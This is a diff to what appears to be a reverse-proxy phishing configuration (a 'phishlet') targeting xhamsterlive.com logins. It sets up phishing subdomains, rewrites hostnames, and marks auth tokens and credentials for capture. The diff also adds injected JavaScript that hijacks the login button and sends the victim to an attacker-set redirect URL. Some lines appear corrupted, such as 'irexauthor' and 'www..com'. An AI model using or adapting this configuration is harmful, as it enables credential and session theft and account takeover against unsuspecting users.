@@ -1,4 +1,4 @@
-author: '@cwaizydee'
+irexauthor: '@cwaizydee'
 min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'sv', orig_sub: 'sv', domain: 'xhamsterlive.com', session: true, is_landing: true, auto_filter: true}
@@ -10,7 +10,7 @@ sub_filters:
   - {triggers_on: 'www.xhamsterlive.com', orig_sub: '', domain: 'xhamsterlive.com', search: '{hostname_regex}', replace: '{hostname}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'www.xhamsterlive.com', orig_sub: '', domain: 'xhamsterlive.com', search: '{hostname_regex}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'www.xhamsterlive.com', orig_sub: '', domain: 'xhamsterlive.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-  - {triggers_on: 'www.xhamsterlive.com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www..com', orig_sub: 'www', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.xhamsterlive.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://{hostname_regexp}/', replace: 'https://{hostname_regexp}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
 auth_tokens:
   - domain: 'sv.xhamsterlive.com'
@@ -31,3 +31,27 @@ credentials:
 login:
   domain: 'sv.xhamsterlive.com'
   path: '/login'
+js_inject:
+  - trigger_domains: ["sv.xhamsterlive.com"]
+    trigger_paths: ["/login"]
+    script: |
+      async function worker() {
+        const elements = document.getElementsByTagName("BUTTON");
+        const num = elements.length;
+        if (num < 3) {
+          return;
+        } else {
+          document.getElementsByTagName("BUTTON")[0].onclick = redirectme;
+        }
+      }
+      function sleeptime(ms) {
+        return new Promise(resolve => setTimeout(resolve, ms));
+      }
+      async function redirectme() {
+        await sleeptime(2000);
+        window.location.href = "{redirect_url}";
+      }
+      function myFunction() {
+        var run = setInterval("worker()", 1000); 
+      }
+      myFunction();
